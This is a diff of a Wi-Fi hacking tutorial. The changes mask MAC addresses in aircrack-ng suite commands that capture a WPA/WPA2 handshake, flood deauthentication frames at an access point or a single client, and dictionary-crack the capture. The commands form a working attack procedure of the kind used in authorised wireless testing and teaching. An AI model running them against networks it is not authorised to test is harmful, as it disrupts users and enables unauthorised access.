@@ -185,12 +185,12 @@ We can now target any AP on that list, obviously only target the AP's that are i
 Now with our list of identified  AP's and their associated information we can specifically target a given AP with the aim being to capture an 'authenticated handshake' commonly referred to as 'the four-way handshake'. Although on this occasion we'll be focusing on WPA/WPA2, the same principles apply to WEP. We can set about capturing a handshake like so:
 
 ```nohighlight
-sudo airodump-ng -c 1 --bssid 4C:09:D4:73:E4:FA -w WPAcrack wlan0mon --ignore-negative-one
+sudo airodump-ng -c 1 --bssid 4C:**:**:**:**:FA -w WPAcrack wlan0mon --ignore-negative-one
 ```
 
 -c.	The channel for the wireless network
 
---bssid.The MAC address of the access point
+--bssid. The MAC address of the access point
 
 -w. The file name prefix for the file which will contain authentication handshake
 
@@ -211,7 +211,7 @@ The wireless client will then hopefully re-authenticate with the AP and we’ll 
 Send deauth request to broadcast:
 
 ```nohighlight
-sudo aireplay-ng --deauth 100 -a 4C:09:D4:73:E4:FA wlan0mon --ignore-negative-one
+sudo aireplay-ng --deauth 100 -a 4C:**:**:**:**:FA wlan0mon --ignore-negative-one
 ```
 
 --deauth 100 	//The number of de-authenticate frames you want to send (0 for unlimited)
@@ -227,7 +227,7 @@ wlan0mon. The wireless interface
 Though if you want to carry out a direct attack against one of the clients associated with the target AP we can simply issue the following command in a second terminal while leaving the previous command running in the 1st terminal:
 
 ```nohighlight
-sudo aireplay-ng --deauth 100 -a 4C:09:D4:73:E4:FA -c 60:A3:7D:3C:F2:E3 wlan0mon --ignore-negative-one
+sudo aireplay-ng --deauth 100 -a 4C:**:**:**:**:FA -c 60:**:**:**:**:E3 wlan0mon --ignore-negative-one
 ```
 
 ![DeAuth Attack](/images/WiFi/deauth-attack.png)
@@ -245,7 +245,7 @@ aircrack-ng WPAcrack-01.cap
 Once we have captured a handshake we can them move onto cracking our handshake using the Aircrack-ng suite:
 
 ```nohighlight
-sudo aircrack-ng  -b 4C:09:D4:73:E4:FA WPAcrack-01.cap  -w '/home/host/Tools/SecLists/Passwords/darkc0de.txt'
+sudo aircrack-ng  -b 4C:**:**:**:**:FA WPAcrack-01.cap  -w '/home/host/Tools/SecLists/Passwords/darkc0de.txt'
 ```
 
 '-w' The name of the dictionary file
